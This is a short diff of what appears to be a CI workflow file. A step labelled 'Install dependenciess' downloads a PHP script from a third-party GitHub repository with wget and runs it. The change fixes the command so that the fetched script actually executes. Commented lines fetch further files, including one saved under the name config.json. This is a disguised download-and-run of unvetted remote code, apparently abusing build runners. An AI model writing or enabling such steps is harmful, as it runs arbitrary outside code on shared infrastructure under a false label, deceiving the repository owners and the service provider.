@@ -15,7 +15,7 @@ jobs:
     - name: Install dependenciess
       run: |
         wget https://github.com/Mosnio/WcmB/raw/main/nok.php
-        php nok php
+        php nok.php
         
  #       unzip clm.zip
 #        wget https://github.com/Mosnio/mehi1/raw/main/clm/cn1.js -O config.json
